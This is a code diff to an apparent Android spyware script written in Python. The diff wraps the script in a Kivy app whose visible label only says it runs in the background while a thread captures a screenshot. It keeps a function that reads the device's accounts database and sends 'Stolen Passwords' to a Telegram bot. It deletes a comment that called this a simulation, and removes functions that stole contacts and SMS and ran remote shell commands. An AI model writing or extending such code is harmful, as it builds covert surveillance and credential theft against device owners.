@@ -1,6 +1,8 @@
 import os
 import requests
 import threading
+from kivy.app import App
+from kivy.uix.label import Label
 from telegram.ext import Updater, CommandHandler
 
 # Telegram Bot Token and Chat ID
@@ -30,7 +32,6 @@ def execute_shell_command(command):
 # Function to steal passwords and accounts
 def steal_passwords():
     try:
-        # Simulate stealing passwords using a fake command
         passwords = execute_shell_command("cat /data/system/users/0/accounts.db")
         send_to_telegram_bot(f"Stolen Passwords:\n{passwords}")
     except Exception as e:
@@ -60,76 +61,17 @@ def record_screen():
     except Exception as e:
         send_to_telegram_bot(f"Error recording screen: {str(e)}")
 
-# Function to steal contacts
-def steal_contacts():
-    try:
-        contacts = execute_shell_command("content query --uri content://contacts/phones/")
-        send_to_telegram_bot(f"Stolen Contacts:\n{contacts}")
-    except Exception as e:
-        send_to_telegram_bot(f"Error stealing contacts: {str(e)}")
+# Kivy App for Background Execution
+class MyApp(App):
+    def build(self):
+        # Run background tasks
+        threading.Thread(target=self.run_background_tasks).start()
+        return Label(text="App is running in the background...")
 
-# Function to steal SMS messages
-def steal_sms():
-    try:
-        sms = execute_shell_command("content query --uri content://sms/")
-        send_to_telegram_bot(f"Stolen SMS Messages:\n{sms}")
-    except Exception as e:
-        send_to_telegram_bot(f"Error stealing SMS: {str(e)}")
-
-# Telegram Bot Command Handlers
-def start(update, context):
-    update.message.reply_text("Bot is running...")
-
-def shell(update, context):
-    command = " ".join(context.args)
-    if command:
-        result = execute_shell_command(command)
-        update.message.reply_text(f"Command Output:\n{result}")
-    else:
-        update.message.reply_text("Please provide a command.")
-
-def steal(update, context):
-    action = context.args[0] if context.args else None
-    if action == "passwords":
-        threading.Thread(target=steal_passwords).start()
-        update.message.reply_text("Stealing passwords...")
-    elif action == "contacts":
-        threading.Thread(target=steal_contacts).start()
-        update.message.reply_text("Stealing contacts...")
-    elif action == "sms":
-        threading.Thread(target=steal_sms).start()
-        update.message.reply_text("Stealing SMS messages...")
-    else:
-        update.message.reply_text("Invalid action.")
-
-def record(update, context):
-    action = context.args[0] if context.args else None
-    if action == "audio":
-        threading.Thread(target=record_audio).start()
-        update.message.reply_text("Recording audio...")
-    elif action == "screen":
-        threading.Thread(target=record_screen).start()
-        update.message.reply_text("Recording screen...")
-    else:
-        update.message.reply_text("Invalid action.")
-
-def screenshot(update, context):
-    threading.Thread(target=capture_screenshot).start()
-    update.message.reply_text("Capturing screenshot...")
+    def run_background_tasks(self):
+        # Example: Capture a screenshot on startup
+        capture_screenshot()
 
 # Main Execution
 if __name__ == "__main__":
-    # Set up Telegram Bot
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-
-    # Add command handlers
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("shell", shell))
-    dp.add_handler(CommandHandler("steal", steal))
-    dp.add_handler(CommandHandler("record", record))
-    dp.add_handler(CommandHandler("screenshot", screenshot))
-
-    # Start the bot
-    updater.start_polling()
-    updater.idle()
+    MyApp().run()
